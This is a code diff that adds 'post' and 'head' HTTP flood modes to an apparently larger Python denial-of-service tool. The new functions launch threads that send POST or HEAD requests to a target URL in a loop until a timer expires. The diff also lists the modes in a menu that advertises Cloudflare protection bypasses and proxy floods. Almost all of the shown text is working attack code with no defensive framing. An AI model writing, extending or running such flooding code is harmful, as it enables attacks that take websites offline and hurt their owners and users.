@@ -27,6 +27,49 @@ def get_proxies():
     proxies = open("./proxy.txt", 'r').read().split('\n')
     return True
 
+def LaunchHEAD(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    threads_count = 0
+    while threads_count <= int(th):
+        try:
+            thd = threading.Thread(target=AttackHEAD, args=(url, until))
+            thd.start()
+            threads_count += 1
+        except:
+            pass
+
+def AttackHEAD(url, until_datetime):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            for i in range(50):
+                requests.head(url)
+                requests.head(url)
+                requests.head(url)
+                requests.head(url)
+        except:
+            pass
+
+def LaunchPOST(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    threads_count = 0
+    while threads_count <= int(th):
+        try:
+            thd = threading.Thread(target=AttackPOST, args=(url, until))
+            thd.start()
+            threads_count += 1
+        except:
+            pass
+
+def AttackPOST(url, until_datetime):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            requests.post(url)
+            requests.post(url)
+            requests.post(url)
+            requests.post(url)
+        except:
+            pass
+
 #region RAW
 def LaunchRAW(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
@@ -477,6 +520,28 @@ def command():
         timer.start()
         LaunchRAW(target, thread, t)
         timer.join()
+    elif command == "post":
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
+        target = input()
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
+        thread = input()
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
+        t = input()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchPOST(target, thread, t)
+        timer.join()
+    elif command == "head":
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
+        target = input()
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
+        thread = input()
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
+        t = input()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchHEAD(target, thread, t)
+        timer.join()
     elif command == "pxraw":
         if get_proxies():
             stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
@@ -548,6 +613,8 @@ def func():
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfpro      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfsoc      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"raw        "+Fore.RED+": "+Fore.WHITE+"Request attack\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"post       "+Fore.RED+": "+Fore.WHITE+"Post request attack\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"head       "+Fore.RED+": "+Fore.WHITE+"Head request attack\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"soc        "+Fore.RED+": "+Fore.WHITE+"Socket attack\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxraw      "+Fore.RED+": "+Fore.WHITE+"Proxy Request attack\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxsoc      "+Fore.RED+": "+Fore.WHITE+"Proxy Socket attack\n")
